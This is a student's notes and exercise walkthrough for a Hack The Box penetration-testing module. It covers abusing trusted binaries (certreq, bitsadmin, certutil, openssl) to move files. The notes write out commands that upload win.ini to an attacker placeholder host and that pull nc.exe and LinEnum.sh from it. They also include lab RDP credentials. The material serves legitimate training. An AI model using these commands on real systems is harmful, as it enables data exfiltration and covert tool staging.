### CPTS / HTB Penetration Tester Path <br>
### File Transfers - Living Off The Land <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Living Off The Land



LOLBins (Living Off the Land binaries) — trusted binaries already on the system, abused for unintended functions. Coined by Christopher Campbell + Matt Graeber at DerbyCon 3.

Two reference projects:

- [LOLBAS Project (Windows)](https://lolbas-project.github.io)
- [GTFOBins (Linux)](https://gtfobins.github.io)

Functions covered: download, upload, command exec, file read, file write, AppLocker bypass.

LOLBAS — search filters: `/download`, `/upload`. Example: `certreq.exe -Post` uploads any file to a remote URL.

Listen on attacker:

```diff
+ $ sudo nc -lvnp 8000
```

Push file from Windows target:

```diff
+ C:\> certreq.exe -Post -config http://<attacker>:8000/ c:\windows\win.ini
```

If `-Post` errors out, the local certreq is too old — grab an updated copy from [juliourena's mirror](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe).

GTFOBins — search filters: `+file download`, `+file upload`. Example: `openssl s_server` / `s_client` for nc-style transfer over TLS.

Generate cert, stand up TLS server (file = stdin):

```diff
+ $ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+ $ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Pull from compromised target:

```diff
+ $ openssl s_client -connect <attacker>:80 -quiet > LinEnum.sh
```

Bitsadmin — Windows Background Intelligent Transfer Service. Throttles based on host/network load. Common LOLBin for downloads.

```diff
+ PS> bitsadmin /transfer wcb /priority foreground http://<attacker>:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

PowerShell wrapper:

```diff
+ PS> Import-Module bitstransfer; Start-BitsTransfer -Source "http://<attacker>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

Certutil — found by Casey Smith ([@subTee](https://twitter.com/subtee?lang=en)). Defacto Windows `wget` for years; AMSI now flags it as malicious.

```diff
+ C:\> certutil.exe -verifyctl -split -f http://<attacker>:8000/nc.exe
```

| Binary | OS | Method | Notes |
|---|---|---|---|
| `certreq.exe` | Windows | upload via `-Post` | trusted MS signed binary |
| `bitsadmin` | Windows | download (BITS) | network-aware throttling |
| `certutil.exe` | Windows | download | AMSI flags it now |
| `openssl s_client/s_server` | Linux | TLS-encrypted nc | almost always installed |

<br>

---

<br>

### Living Off The Land Exercise

IP: 10.129.200.230

---

### Question 1:
Connect to the target machine via RDP (Username: htb-student | Password: HTB_@cademy_stdnt!) and use Living Off The Land techniques presented in this section or any other found on the LOLBAS and GTFOBins websites to transfer files between the Pwnbox and the Windows target. Type "DONE" when finished.

#### Connect via xfreerdp:

```diff
+ $ xfreerdp /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.200.230
```

#### Pwnbox netcat listener for `certreq.exe -Post` upload:

```diff
+ $ sudo nc -lvnp 8000
```

#### From the RDP session, push a file via certreq:

```diff
+ C:\> certreq.exe -Post -config http://<pwnbox>:8000/ c:\windows\win.ini
```

#### Or pull a file via bitsadmin:

```diff
+ PS> bitsadmin /transfer wcb /priority foreground http://<pwnbox>:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

&#x1F6A9; **DONE**.
